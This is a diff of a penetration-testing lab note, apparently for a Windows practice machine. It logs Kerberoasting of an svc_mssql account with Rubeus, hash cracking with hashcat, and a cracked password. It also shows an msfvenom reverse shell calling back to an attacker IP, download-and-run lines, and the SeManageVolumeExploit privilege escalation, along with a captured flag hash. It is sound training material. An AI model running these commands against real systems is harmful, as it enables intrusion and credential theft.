@@ -9,7 +9,7 @@
 
 Main Objectives:
 
-Local.txt = 
+Local.txt = 1db313339ea5d669c423a051bc087d32
 Proof.txt = 
 
 **Enumeration**
@@ -1252,28 +1252,82 @@ Get-ChildItem C:\ -Recurse -Include *pass*,*cred*,*secret* -ErrorAction Silently
 
 14. Automated Enumeration
 
-```
 
 
-
-
-```
 
 15. Possible PE Paths
 
 ```
-
+svc_mssql. There could be a possible Keroasting exploit.
 
 
 ```
 
 **Privilege Escalation**
 
-1. PE Steps
+- Downloaded rubeus.exe to victim system.
 
 ```
+iwr -uri http://192.168.45.230/Rubeus.exe -Outfile Rubeus.exe
+```
+
+- Ran rebeus.exe to see if I could Kerberoast the svc_mssql account.
 
 ```
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+```
+ ![[Pasted image 20260207103456.png]]
+
+- Cracked hashes.kerberoast using hashcat.
+
+```
+sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force 
+```
+
+![[Pasted image 20260207103820.png]]
+
+- In order to run to get an interactive session as svc_mssql, had to download Invoke-RunasCs from https://github.com/antonioCoco/RunasCs/ and copy to victim system.
+
+```
+iwr -uri http://192.168.45.230/Invoke-RunasCs.ps1 -Outfile Invoke-RunasCs.ps1
+Import-Module ./Invoke-RunasCs.ps1
+```
+
+- Create reverse shell .exe to run as svc_mssql user.
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.230 LPORT=445 -f exe > shell.exe
+```
+
+- Executed reverse shell using Invoke-RunasCs.
+
+```
+Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command ".\shell.exe"
+```
+
+- Received reverse shell as svc_mssql.
+
+![[Pasted image 20260207105444.png]]
+
+- As svc_mssql ran whoami /priv
+
+![[Pasted image 20260207115224.png]]
+
+- Downloaded SeManageVolumeExploit.exe from https://github.com/CsEnox/SeManageVolumeExploit/. 
+	- This exploit grants full permission on C:\ drive for all users on the machine.
+		- Enables the privilege in the token
+		- Creates handle to \.\C: with SYNCHRONIZE | FILE_TRAVERSE
+		- Sends the FSCTL_SD_GLOBAL_CHANGE to replace S-1-5-32-544 with S-1-5-32-545
+		- Moved exploit over to victim machine and executed. 
+- Moved exploit to victim machine and executed. 
+
+```
+iwr -uri http://192.168.45.230/SeManageVolumeExploit.exe -Outfile SeManageVolumeExploit.exe
+.\SeManageVolumeExploit.exe
+```
+- Accessed proof.txt with new permissions.
+
+![[Pasted image 20260207115607.png]]
 
 2. Notes
 
